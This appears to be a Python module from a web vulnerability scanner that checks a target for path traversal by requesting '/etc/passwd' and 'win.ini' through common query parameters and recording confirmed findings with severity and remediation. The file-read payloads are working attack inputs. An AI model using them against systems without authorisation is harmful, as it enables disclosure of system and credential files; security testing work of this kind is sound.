import re
from typing import List, Dict, Any
from engine.requester import Requester
from engine.baseline import TargetBaseline

LFI_PAYLOADS = [
    {"payload": "../../../../etc/passwd", "regex": r"root:[x*]:0:0:", "os": "Linux/UNIX"},
    {"payload": "../../../../windows/win.ini", "regex": r"\[fonts\]|\[extensions\]", "os": "Windows"}
]
LFI_PARAMS = ["file", "path", "page", "include", "doc", "view", "template"]

async def run_path_traversal_scan(requester: Requester, baseline: TargetBaseline, scan_id: str, target_url: str) -> List[Dict[str, Any]]:
    findings = []
    base_clean = target_url.rstrip("/")
    for param in LFI_PARAMS[:3]:
        for lfi in LFI_PAYLOADS:
            test_url = f"{base_clean}/?{param}={lfi['payload']}"
            res = await requester.send("GET", test_url, module="path_traversal")
            if baseline.is_similar_to_nonexistent(res):
                continue
            match = re.search(lfi["regex"], res.body, re.IGNORECASE)
            if match:
                findings.append({
                    "scan_id": scan_id, "target_url": target_url, "endpoint": test_url, "tested_endpoint": test_url,
                    "parameter_name": param, "parameter_location": "Query Parameter",
                    "payload_used": f"?{param}={lfi['payload']}", "payload_type": "Path Traversal Sequence Probe",
                    "vuln_type": "Path Traversal / Local File Inclusion (LFI)",
                    "title": f"Path Traversal via '{param}' parameter ({lfi['os']})",
                    "severity": "CRITICAL", "confidence": "CONFIRMED", "is_confirmed": True,
                    "cvss_score": 9.3, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    "cwe_id": "CWE-22", "owasp_category": "A01:2021-Broken Access Control",
                    "category": "Server-Side Injection", "template_id": "vf-lfi-passwd",
                    "short_description": f"The parameter '{param}' accepted traversal sequences and returned system file contents.",
                    "description": f"Arbitrary system file retrieval verified on parameter '{param}'.",
                    "technical_impact": "Full disclosure of system configuration files, passwords, credentials, and potential RCE.",
                    "remediation": "Validate path inputs against a strict allowlist. Use functions like realpath() or resolve().",
                    "request_method": "GET", "raw_request": res.raw_request, "request_headers": res.request_headers,
                    "request_body": res.request_body, "raw_response": res.raw_response, "response_headers": res.headers,
                    "response_body": res.body[:50000], "response_status": res.status_code, "response_time_ms": res.duration_ms,
                    "baseline_raw_response": baseline.root_response.raw_response if baseline.root_response else "",
                    "verification_proof": f"Successfully extracted system file: matched regex '{lfi['regex']}' on token '{match.group(0)}'."
                })
                break
    return findings
